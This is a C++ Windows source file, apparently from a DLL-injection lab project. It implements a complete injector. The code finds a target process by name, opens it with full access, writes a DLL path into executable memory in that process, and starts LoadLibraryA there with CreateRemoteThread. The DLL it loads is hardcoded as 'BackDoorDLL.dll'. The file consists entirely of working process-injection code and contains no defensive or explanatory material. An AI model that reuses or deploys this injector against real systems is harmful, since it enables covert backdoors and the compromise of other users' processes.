#include "Injector.h"

Injector::Injector(wstring procName) {

    int pid = GetProcessByName(procName);

    if (pid < 0) {
        cout << "Could not find process name\n";
        return;
    }

    Inject(pid);
}

int Injector::GetProcessByName(wstring name)
{
    DWORD pid = -1;

    // Create toolhelp snapshot.
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(process);

    // Walkthrough all processes.
    if (Process32First(snapshot, &process))
    {
        do
        {
            // Compare process.szExeFile based on format of name, i.e., trim file path
            // trim .exe if necessary, etc.
            if (wstring(process.szExeFile) == name)
            {
                pid = process.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return pid;
}

void Injector::Inject(int pid) {
    HANDLE processHandle;
    PVOID remoteBuffer;
    char dllPath[] = "C:\\Users\\Caio\\source\\repos\\DLLInjectionAndMonitor\\x64\\Release\\BackDoorDLL.dll";
    char fullFilename[MAX_PATH];

    // needs to be the full path, since the application will be running in another folder than this application
    GetFullPathNameA(dllPath, MAX_PATH, fullFilename, nullptr);
    int dllLen = strlen(fullFilename);

    cout << "Injecting DLL to PID: " + std::to_string(pid) << '\n';
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    remoteBuffer = VirtualAllocEx(processHandle, NULL, dllLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (remoteBuffer == NULL) {
        cout << "Error\n";
        return;
    }

    if (WriteProcessMemory(processHandle, remoteBuffer, fullFilename, dllLen, NULL) == false) {
        printf("\t[FAILURE]  Failed to write the dll path into memory.\n");
        return;
    }

    HMODULE modHand = GetModuleHandle(TEXT("kernel32.dll"));

    if (modHand == NULL) {
        cout << "Error\n";
        return;
    }

    LPVOID loadLibraryAAddr = (LPVOID)GetProcAddress(modHand, "LoadLibraryA");

    if (loadLibraryAAddr == NULL) {
        cout << "Error\n";
        return;
    }

    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)loadLibraryAAddr;

    HANDLE hLoadThread = CreateRemoteThread(processHandle, NULL, NULL, threatStartRoutineAddress, remoteBuffer, NULL, NULL);
    CloseHandle(processHandle);

    return;
}